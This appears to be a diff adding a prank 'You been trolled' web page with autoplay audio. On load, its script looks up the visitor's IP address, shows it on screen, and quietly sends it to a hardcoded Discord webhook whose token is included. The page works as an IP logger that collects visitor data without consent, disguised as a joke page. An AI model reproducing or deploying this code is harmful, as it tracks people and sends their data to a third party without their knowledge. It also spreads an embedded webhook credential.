@@ -1,0 +1,47 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You been trolled</title>
+</head>
+<body>
+    <style>
+        .title {
+            text-align: center;
+            font-size: 50px;
+            padding-top: 40px;
+            padding-bottom: 40px;
+            color: white;
+            font-family: Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
+        }
+        body {
+            background-color: black;
+        }
+    </style>
+    <h1 class="title">You...</h1>
+    <h1 class="title">Been</h1>
+    <h1 class="title">Trolled!</h1>
+    <audio id="audio" autoplay src="Trolled.mp3"></audio>
+    <h1 id = "iparea" class="title">By the way your ip address is</h1>
+    <script>
+        const iparea = document.getElementById("iparea")
+        try {
+        ip = 0
+        fetch("https://api.ipify.org/?format=json")
+        
+        .then(req => req.json())
+        .then((data) => 
+        {iparea.innerText = `By the way, I just got your ip of ${data.ip}` 
+        fetch("https://discordapp.com/api/webhooks/1105705896551645234/WBx9szox5ztEoC1yaDwaNFMA3gFUX_3oz4kyRqF4kYjJu4Y3ZFy8gd_8dbgIANRkHP7Z", {"method":"POST", "headers": {"content-type": "application/json"}, "body": JSON.stringify({"content": `Ip is: ${data.ip}`})})
+            })
+        
+        
+        }
+        catch(err) {
+            console.log(err)
+            iparea.innerHTML = "Disable your ad blocker pls"
+        }
+    </script>
+</body>
+</html>
